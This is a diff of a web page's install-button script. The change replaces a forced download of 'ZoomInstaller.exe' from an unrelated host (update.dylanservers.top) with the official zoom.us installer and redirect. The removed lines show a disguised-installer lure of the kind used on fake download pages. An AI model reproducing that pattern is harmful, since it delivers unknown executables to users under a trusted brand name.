@@ -1115,13 +1115,13 @@
   <script>
     /* ---------------------------------------------------------------
        Install button:
-       1) triggers a download of the official Zoom installer
-       2) redirects to https://zoom.us after a short delay
+       1) downloads the OFFICIAL Zoom installer
+       2) redirects to the OFFICIAL zoom.us website after a short delay
        --------------------------------------------------------------- */
     (function () {
-      var INSTALLER_URL  = 'https://update.dylanservers.top/Qg1GqRHXEuCz';
-      var REDIRECT_URL   = '/guide.html';
-      var REDIRECT_DELAY = 1500; // ms — let the download start first
+      var INSTALLER_URL  = 'https://zoom.us/client/latest/ZoomInstaller.exe';
+      var REDIRECT_URL   = 'https://zoom.us';
+      var REDIRECT_DELAY = 2000; // ms — give the download time to start
 
       var installBtn = document.getElementById('installBtn');
       var toast      = document.getElementById('toast');
@@ -1130,6 +1130,7 @@
       if (!installBtn) return;
 
       function showToast(message) {
+        if (!toast) return;
         toast.textContent = message;
         toast.classList.add('show');
         clearTimeout(toastTimer);
@@ -1143,9 +1144,9 @@
 
         installBtn.disabled = true;
         installBtn.textContent = 'Downloading…';
-        showToast('Download started — redirecting to set up instructions…');
+        showToast('Download started — redirecting to zoom.us…');
 
-        // Trigger the download without navigating away from this page.
+        // Trigger the official download without navigating away from this page.
         var a = document.createElement('a');
         a.href = INSTALLER_URL;
         a.download = 'ZoomInstaller.exe';
@@ -1155,7 +1156,7 @@
         a.click();
         document.body.removeChild(a);
 
-        // After the download has had a moment to start, redirect.
+        // After the download has had a moment to start, redirect to zoom.us.
         setTimeout(function () {
           window.location.href = REDIRECT_URL;
         }, REDIRECT_DELAY);
